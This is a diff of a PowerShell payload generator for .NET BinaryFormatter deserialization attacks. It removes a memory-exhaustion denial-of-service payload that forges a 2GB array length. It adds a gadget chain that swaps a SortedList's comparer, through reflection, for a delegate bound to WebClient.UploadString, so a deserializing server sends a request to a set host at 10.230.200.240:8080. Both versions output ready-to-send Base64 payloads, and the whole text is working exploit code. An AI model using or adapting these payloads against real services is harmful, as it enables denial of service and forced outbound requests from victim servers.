@@ -1,34 +1,52 @@
+# --- Configuration ---
+$targetUrl = "http://10.230.200.240:8080/"
+$dummyData = "test"
+
 # --- Payload Construction ---
-Write-Host "[*] Building Memory Exhaustion payload..." -ForegroundColor Cyan
+Write-Host "[*] Building WebClient Deserialization payload..." -ForegroundColor Cyan
 
-# 1. Create a tiny 1-byte array
-$byteArray = New-Object byte[] 1
-$byteArray[0] = 0x41 # 'A'
+# 1. Create a WebClient instance and get the UploadString method
+$webClient = New-Object System.Net.WebClient
+$uploadMethod = $webClient.GetType().GetMethod('UploadString', [Type[]]@([string], [string]))
 
-# 2. Serialize it using BinaryFormatter
-$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-$ms = New-Object System.IO.MemoryStream
-$formatter.Serialize($ms, $byteArray)
-$payload = $ms.ToArray()
+# 2. Create a Comparison<string> delegate bound to the WebClient instance
+$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $webClient, $uploadMethod)
 
-# 3. Find and modify the array length
-# The serialized format ends with the array data (0x41). 
-# The 4 bytes immediately preceding the data are the array length (00 00 00 01).
-$dataIndex = $payload.Length - 1
-if ($payload[$dataIndex] -eq 0x41) {
-    # Overwrite the length with 0x7FFFFFFF (2,147,483,647)
-    # This forces the deserializer to try allocating a massive array.
-    $payload[$dataIndex - 4] = 0x7F
-    $payload[$dataIndex - 3] = 0xFF
-    $payload[$dataIndex - 2] = 0xFF
-    $payload[$dataIndex - 1] = 0xFF
-    Write-Host "[+] Array length successfully modified to 2GB." -ForegroundColor Green
-} else {
-    Write-Host "[-] Could not locate array data. Payload generation failed." -ForegroundColor Red
-    exit
+# 3. Load the internal ComparisonComparer<string> type via Reflection
+$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
+$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])
+
+# 4. Create an instance of ComparisonComparer<string> with the malicious delegate
+$comparisonDelegateType = [System.Comparison[string]]
+$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
+$maliciousComparer = $constructor.Invoke(@($maliciousDelegate))
+
+# 5. Create a SortedList and populate it with our target URL and dummy data
+# We use the default comparer initially to avoid triggering the payload locally.
+$sortedList = New-Object System.Collections.Generic.SortedList[string, string] ([System.Collections.Generic.Comparer[string]]::Default)
+$sortedList.Add($targetUrl, $dummyData)
+$sortedList.Add("http://dummy.com", "dummy") # Add a second item to force a comparison during deserialization
+
+# 6. Swap the internal comparer with our malicious one
+$comparerField = $sortedList.GetType().GetField('comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
+if (-not $comparerField) {
+    $comparerField = $sortedList.GetType().GetField('_comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
 }
+$comparerField.SetValue($sortedList, $maliciousComparer)
 
-# 4. Output the payload as a Base64 string
-$base64Payload = [Convert]::ToBase64String($payload)
-Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
-Write-Host "Base64 Payload: $base64Payload"
+# --- Serialization ---
+Write-Host "[*] Serializing object..." -ForegroundColor Cyan
+try {
+    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+    $ms = New-Object System.IO.MemoryStream
+    $formatter.Serialize($ms, $sortedList)
+    
+    $payload = $ms.ToArray()
+    if ($payload.Length -eq 0) { throw "Serialization returned empty." }
+
+    $base64Payload = [Convert]::ToBase64String($payload)
+    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
+    Write-Host "Base64 Payload: $base64Payload"
+} catch {
+    Write-Host "[-] Error: $_" -ForegroundColor Red
+}
